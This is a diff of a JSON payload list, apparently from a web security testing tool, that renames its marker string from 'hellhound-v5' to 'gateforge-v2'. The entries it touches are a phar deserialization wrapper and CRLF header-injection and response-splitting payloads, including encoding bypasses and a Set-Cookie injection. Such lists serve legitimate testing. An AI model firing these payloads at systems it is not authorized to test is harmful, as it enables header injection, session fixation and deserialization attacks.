@@ -191,7 +191,7 @@
     },
     {
       "category": "phar",
-      "payload": "phar:///tmp/hellhound.phar/",
+      "payload": "phar:///tmp/gateforge.phar/",
       "note": "Phar deserialization wrapper"
     }
   ],
@@ -242,32 +242,32 @@
   "crlf_injection": [
     {
       "category": "crlf_basic",
-      "payload": "%0d%0aX-Injected:%20hellhound-v5",
+      "payload": "%0d%0aX-Injected:%20gateforge-v2",
       "note": "CRLF URL-encoded, header injection"
     },
     {
       "category": "crlf_basic",
-      "payload": "%0aX-Injected:%20hellhound-v5",
+      "payload": "%0aX-Injected:%20gateforge-v2",
       "note": "LF only \u2014 some servers split on LF alone"
     },
     {
       "category": "crlf_basic",
-      "payload": "\r\nX-Injected: hellhound-v5",
+      "payload": "\r\nX-Injected: gateforge-v2",
       "note": "Raw CRLF \u2014 test unencoded path"
     },
     {
       "category": "crlf_double",
-      "payload": "%0d%0a%0d%0aX-Injected:%20hellhound-v5",
+      "payload": "%0d%0a%0d%0aX-Injected:%20gateforge-v2",
       "note": "Double CRLF \u2014 HTTP response splitting"
     },
     {
       "category": "crlf_utf8",
-      "payload": "%E5%98%8A%E5%98%8DX-Injected:%20hellhound-v5",
+      "payload": "%E5%98%8A%E5%98%8DX-Injected:%20gateforge-v2",
       "note": "UTF-8 CRLF sequence (Jetty bypass)"
     },
     {
       "category": "crlf_unicode",
-      "payload": "%u000d%u000aX-Injected:%20hellhound-v5",
+      "payload": "%u000d%u000aX-Injected:%20gateforge-v2",
       "note": "Unicode CRLF \u2014 IIS bypass"
     },
     {
@@ -277,7 +277,7 @@
     },
     {
       "category": "crlf_setcookie",
-      "payload": "%0d%0aSet-Cookie:%20session=hellhound-v5;Path=/",
+      "payload": "%0d%0aSet-Cookie:%20session=gateforge-v2;Path=/",
       "note": "CRLF + cookie injection"
     },
     {
